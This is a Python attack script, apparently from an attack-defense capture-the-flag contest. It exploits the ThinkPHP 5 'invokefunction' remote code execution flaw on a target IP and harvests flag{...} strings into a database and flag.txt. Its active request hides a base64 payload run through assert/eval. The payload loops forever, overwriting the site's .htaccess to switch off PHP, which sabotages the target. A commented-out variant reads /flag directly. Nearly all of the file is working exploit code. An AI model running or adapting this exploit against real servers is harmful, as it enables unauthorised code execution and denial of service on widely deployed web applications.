from code.AttackCore import *
import re
from db.Utils import *
session = Session()
utils = Utils()
threadLock = threading.Lock()

def write_flag(flag):
    f = open('flag.txt', 'a+', encoding='utf8')
    f.write(flag[0]+'\n')
    f.close()

def write_flag_text(flag):
    f = open('flag.txt', 'a+', encoding='utf8')
    f.write(flag+'\n')
    f.close()
def payload(ip):
    ###Don't use (import request)
    #############################################################
    #     burp0_url = f"http://{ip}/index.php?s=home/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=readfile&vars[1][]=/flag"
    # burp0_cookies = {"PHPSESSID": "1ifekrqs6nr5flvlakpiq13rp5"}
    # burp0_headers = {
    #     "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
    #     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
    #     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    #     "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    # res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)


    burp0_url = f"http://{ip}/index.php?s=home%2f%5cthink%5capp%2finvokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval(base64_decode(%27JGZpbGU9Jy92YXIvd3d3L2h0bWwyL3B1YmxpYy8uaHRhY2Nlc3MnOyRjb2RlID0gJ3BocF9mbGFnIGVuZ2luZSAwJzt3aGlsZSAoMSl7ZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpO3VzbGVlcCg1MDAwMCk7fQ==%27));"
    burp0_cookies = {"PHPSESSID": "1ifekrqs6nr5flvlakpiq13rp5"}
    burp0_headers = {
       "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
    res = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    ############################################################
    if res:
        flag = re.findall(r"flag\{.*\}",res.text)
        logger.info(f"[+]{ip}  " + flag[0])
        # flag = re.findall(r"([a-fA-F\d]{32})", res.text) 匹配32位字符串
        # flag = re.findall(r"flag\{.*\}",res.text) 匹配花括号
        threadLock.acquire()
        insert_flag(ip,flag[0])
        write_flag(flag)
        threadLock.release()

# attack.attack(func=payload)
